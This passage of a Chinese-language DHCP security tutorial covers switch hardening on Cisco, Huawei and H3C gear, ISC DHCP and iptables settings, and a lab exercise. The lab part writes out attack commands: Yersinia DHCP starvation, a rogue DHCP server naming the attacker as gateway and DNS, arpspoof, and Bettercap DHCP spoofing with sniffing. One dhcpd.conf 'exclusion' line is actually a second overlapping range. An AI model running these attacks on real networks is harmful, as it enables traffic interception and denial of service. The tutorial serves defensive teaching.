Switch(config)# interface range GigabitEthernet0/2 - 48
Switch(config-if-range)# ip dhcp snooping limit rate 15

! 配置Option 82插入
Switch(config)# ip dhcp snooping information option

! 配置DHCP Snooping绑定表存储
Switch(config)# ip dhcp snooping database flash:dhcp_snooping.db
Switch(config)# ip dhcp snooping database write-delay 60

! 查看DHCP Snooping状态
Switch# show ip dhcp snooping
Switch# show ip dhcp snooping binding
```

**动态ARP检测配置**

```cisco
! 在VLAN上启用DAI
Switch(config)# ip arp inspection vlan 10,20,30

! 配置信任端口（连接网关或服务器）
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip arp inspection trust

! 配置ARP报文限速
Switch(config)# interface range GigabitEthernet0/2 - 48
Switch(config-if-range)# ip arp inspection limit rate 15

! 配置静态ARP ACL（用于静态IP设备）
Switch(config)# arp access-list STATIC_ARP
Switch(config-ar-acl)# permit ip host 192.168.1.10 mac host 00aa.bbcc.ddee
Switch(config)# ip arp inspection filter STATIC_ARP vlan 10

! 查看DAI状态
Switch# show ip arp inspection
```

**IP源守护配置**

```cisco
! 在端口上启用IPSG（基于源IP）
Switch(config)# interface range GigabitEthernet0/2 - 48
Switch(config-if-range)# ip verify source

! 启用IPSG（基于源IP和MAC）
Switch(config-if-range)# ip verify source vlan 10 dhcp-snooping

! 查看IPSG状态
Switch# show ip verify source
```

**端口安全配置**

```cisco
! 配置端口安全
Switch(config)# interface GigabitEthernet0/2
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2
Switch(config-if)# switchport port-security violation restrict
Switch(config-if)# switchport port-security mac-address sticky

! 配置errdisable自动恢复
Switch(config)# errdisable recovery cause psecure-violation
Switch(config)# errdisable recovery interval 300
```

### 5.2 华为交换机配置

```cisco
# 全局启用DHCP Snooping
[Huawei] dhcp snooping enable

# 在VLAN上启用DHCP Snooping
[Huawei] vlan 10
[Huawei-vlan10] dhcp snooping enable

# 配置信任端口
[Huawei] interface GigabitEthernet0/0/1
[Huawei-GigabitEthernet0/0/1] dhcp snooping trusted

# 配置非信任端口限速
[Huawei] interface GigabitEthernet0/0/2
[Huawei-GigabitEthernet0/0/2] dhcp snooping check rate enable
[Huawei-GigabitEthernet0/0/2] dhcp snooping check rate 15

# 配置动态ARP检测
[Huawei] vlan 10
[Huawei-vlan10] arp anti-attack enable
[Huawei-vlan10] arp anti-attack check user-bind enable

# 配置IPSG
[Huawei] interface GigabitEthernet0/0/2
[Huawei-GigabitEthernet0/0/2] ip source check enable

# 查看DHCP Snooping绑定表
[Huawei] display dhcp snooping user-bind all
```

### 5.3 H3C交换机配置

```cisco
# 启用DHCP Snooping
[H3C] dhcp snooping enable

# 在VLAN上启用
[H3C] vlan 10
[H3C-vlan10] dhcp snooping enable

# 配置信任端口
[H3C] interface GigabitEthernet1/0/1
[H3C-GigabitEthernet1/0/1] dhcp snooping trust

# 配置端口限速
[H3C] interface GigabitEthernet1/0/2
[H3C-GigabitEthernet1/0/2] dhcp rate-limit 15

# 配置DAI
[H3C] vlan 10
[H3C-vlan10] arp detection enable
[H3C-GigabitEthernet1/0/1] arp detection trust

# 查看绑定表
[H3C] display dhcp snooping binding
```

### 5.4 Linux DHCP服务器安全配置

ISC DHCP服务器加固：

```
# /etc/dhcp/dhcpd.conf 安全配置

# 全局配置
default-lease-time 14400;     # 4小时
max-lease-time 28800;         # 8小时
authoritative;                # 权威模式，快速拒绝错误请求
log-facility local7;          # 日志记录
ddns-update-style none;       # 禁用动态DNS更新（如不需要）

# 地址池配置
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.100 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 8.8.8.8, 8.8.4.4;
    option domain-name "internal.example.com";
    option broadcast-address 192.168.1.255;

    # 排除地址
    range 192.168.1.100 192.168.1.150;

    # MAC地址绑定
    host server01 {
        hardware ethernet 00:1a:2b:3c:4d:5e;
        fixed-address 192.168.1.10;
    }

    # 拒绝已知恶意MAC
    host blocked_device {
        hardware ethernet 00:11:22:33:44:55;
        deny booting;
    }
}

# 限制DHCP服务监听接口
# /etc/systemd/system/dhcpd.service 修改ExecStart:
# ExecStart=/usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf eth0
```

防火墙规则加固：

```bash
# 只允许信任接口的DHCP请求
iptables -A INPUT -i eth0 -p udp --dport 67 -m mac \
    --mac-source 00:1a:2b:3c:4d:5e -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport 67 -j DROP

# 限制DHCP响应速率
iptables -A OUTPUT -p udp --sport 67 -m limit --limit 10/s -j ACCEPT
iptables -A OUTPUT -p udp --sport 67 -j DROP

# 记录异常DHCP流量
iptables -A INPUT -i eth0 -p udp --dport 67 -m limit --limit 5/min -j LOG \
    --log-prefix "DHCP_REQUEST: "
```

---

## 六、实战攻防演练

### 6.1 攻击实验环境搭建

**实验拓扑**

```
Internet ---- 路由器 ---- 交换机 ---- DHCP服务器(合法)
                          |
                 +--------+--------+
                 |        |        |
              攻击者   受害者   监控端
```

**环境要求**

- 一台DHCP服务器（合法）：Linux + ISC DHCP
- 一台攻击者：Kali Linux
- 一台受害者：Windows/Linux
- 一台可网管交换机（支持DHCP Snooping）
- 一台监控端：安装Wireshark

**虚拟化实验环境**

使用GNS3或EVE-NG搭建虚拟实验环境：

```
# 拓扑配置
- vIOS交换机（支持DHCP Snooping）
- Linux容器作为DHCP服务器
- Kali容器作为攻击者
- Alpine容器作为受害者
```

### 6.2 Yersinia攻击演示

**DHCP饥饿攻击**

```bash
# 安装Yersinia
apt-get install yersinia

# 交互模式
yersinia -I
# 在界面中选择DHCP协议
# 选择"Launch DHCP starvation attack"

# 命令行模式
sudo yersinia -attack 1 -interface eth0

# 攻击效果验证
# 在DHCP服务器上查看:
cat /var/lib/dhcp/dhcpd.leases | wc -l
# 如果地址池耗尽，数量等于地址池大小

# 在交换机上查看:
show ip dhcp snooping binding
# 可以看到大量绑定的MAC地址
```

**伪造DHCP服务器攻击**

```bash
# 配置伪造DHCP服务器
cat > /etc/dhcp/dhcpd.conf << 'EOF'
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.200 192.168.1.250;
    option routers 192.168.1.254;  # 攻击者IP作为网关
    option domain-name-servers 192.168.1.254;
    default-lease-time 600;
}
EOF

# 启动伪造DHCP服务器
systemctl start isc-dhcp-server

# 同时启动IP转发和ARP欺骗
sysctl net.ipv4.ip_forward=1
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 使用Bettercap一体化攻击
sudo bettercap -iface eth0
set dhcp.spoof on
set dhcp.spoof.gateway 192.168.1.254
dhcp.spoof on
net.sniff on
```

### 6.3 防御验证

**验证DHCP Snooping**

```cisco
# 配置DHCP Snooping后，在攻击者端口发送DHCPOFFER
Switch# show ip dhcp snooping

# 查看绑定表
Switch# show ip dhcp snooping binding

# 查看被丢弃的报文统计
Switch# show ip dhcp snooping statistics

# 从攻击者机器发送DHCPOFFER将被丢弃
# 日志中可以看到违规记录:
Switch# show logging | include DHCP
```

**验证端口安全**

```cisco
# 查看端口安全状态
Switch# show port-security

# 查看端口安全配置
Switch# show port-security interface GigabitEthernet0/10

# 查看违规记录
Switch# show port-security address
```

**验证DAI**

```cisco
# 查看DAI配置
Switch# show ip arp inspection

# 查看DAI统计
Switch# show ip arp inspection statistics
```

---

## 七、最佳实践与加固建议

### 综合安全架构

```
                    +-------------------+
                    | 网络准入控制(NAC) |
                    | 802.1X认证        |
                    +--------+----------+
                             |
                    +--------v----------+
                    | 接入层交换机       |
                    | - DHCP Snooping   |
                    | - 端口安全        |
                    | - 动态ARP检测     |
                    | - IP源守护        |
                    | - 报文限速        |
                    +--------+----------+
                             |
                    +--------v----------+
                    | 汇聚层交换机       |
                    | - DHCP中继代理     |
                    | - Option 82      |
                    | - ACL过滤        |
                    +--------+----------+
                             |
                    +--------v----------+
                    | DHCP服务器        |
                    | - 地址池规划      |
                    | - MAC绑定       |
                    | - 日志审计       |
                    | - 冗余部署       |
                    +-------------------+
```

### 检查清单

| 检查项 | 状态 | 说明 |
|--------|------|------|
| DHCP Snooping已启用 | [ ] | 在所有接入VLAN上启用 |
| 信任端口正确配置 | [ ] | 只连接DHCP服务器和上联链路 |
| 非信任端口限速 | [ ] | 限制DHCP报文速率 |
| 端口安全已启用 | [ ] | 限制MAC地址数量 |
| DAI已启用 | [ ] | 在所有接入VLAN上启用 |
| IPSG已启用 | [ ] | 防止IP地址欺骗 |
| 802.1X认证部署 | [ ] | 确保只有授权设备接入 |
| DHCP服务器加固 | [ ] | 配置MAC绑定、日志 |
| 冗余DHCP部署 | [ ] | 主备DHCP服务器 |
| 日志监控告警 | [ ] | 实时监控DHCP异常 |
| 定期安全审计 | [ ] | 定期检查配置和绑定表 |

### 事件响应流程

```
1. 发现异常（告警/用户报告无法上网）
2. 确认攻击类型（饥饿/伪造服务器/DoS）
3. 定位攻击源（通过Snooping绑定表/端口流量）
4. 紧急处置（关闭攻击端口/隔离攻击者）
5. 影响评估（检查是否有中间人攻击痕迹）
6. 恢复服务（清除恶意租约/重启DHCP服务）
7. 事后分析（完善检测规则/加固配置）
8. 编写报告
```

---

> **参考资源**
>
> - RFC 2131 - Dynamic Host Configuration Protocol
> - RFC 2132 - DHCP Options and BOOTP Vendor Extensions
> - RFC 3118 - Authentication for DHCP Messages
> - RFC 3046 - DHCP Relay Agent Information Option (Option 82)
> - Cisco DHCP Snooping Configuration Guide
> - IEEE 802.1X - Port-Based Network Access Control
